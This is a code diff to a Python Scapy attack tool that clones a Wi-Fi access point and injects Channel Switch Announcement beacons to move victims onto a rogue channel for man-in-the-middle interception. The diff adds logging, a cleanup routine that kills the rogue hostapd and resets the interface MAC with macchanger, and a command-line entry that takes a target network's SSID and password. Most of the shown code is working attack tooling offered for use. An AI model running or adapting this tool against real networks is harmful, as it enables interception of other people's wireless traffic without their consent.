@@ -1,5 +1,6 @@
 from scapy.all import * 
-import textwrap
+import argparse
+import logging
 
 IEEE_TLV_TYPE_SSID    = 0
 IEEE_TLV_TYPE_CHANNEL = 3
@@ -20,6 +21,8 @@ COLORCODES = { "gray"  : "\033[0;37m",
                "orange": "\033[0;33m",
                "red"   : "\033[0;31m" }
 
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 class MitmSocket(L2Socket):
 	def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
@@ -59,7 +62,6 @@ class MitmSocket(L2Socket):
 			return 2457
 		elif(channel == 11):
 			return 2462
-
 
 	def send(self, p, set_radio, channel):
 		# 所有送出去的封包都要加 radiotap
@@ -310,7 +312,6 @@ class Attack():
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
-		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 	
 
@@ -325,7 +326,39 @@ class Attack():
 			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
 			csabeacon = append_csa(beacon, newchannel, 1)
 			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
-		
+
 		if not silent:
 			log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
+
+
+	def stop(self):
+		log(STATUS, "Closing hostapd and cleaning up ...")
+		if self.hostapd:
+			self.hostapd.terminate()
+			self.hostapd.wait()
+		if self.sock_real:
+			self.sock_real.close()
+		if self.sock_rogue:
+			self.sock_rogue.close()
+		subprocess.call(["ifconfig", self.nic_rogue_ap, "down"])
+		subprocess.call(["macchanger", "-p", self.nic_rogue_ap])
+		subprocess.call(["ifconfig", self.nic_rogue_ap, "up"])
+
+
+def cleanup(attack: Attack):
+    attack.stop()
+
+if __name__ == "__main__":
+	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
+	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
+	parser.add_argument("nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
+	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
+	parser.add_argument("ssid", help="The SSID of the network to attack.")
+	parser.add_argument("password", help="The password of the network to attack.")
+
+	args = parser.parse_args()
+	attack = Attack(args.nic_real_mon, args.nic_rogue_mon, args.nic_rogue_ap, args.ssid, args.password)
+
+	atexit.register(cleanup, attack)
+	attack.run(strict_echo_test=False)
 
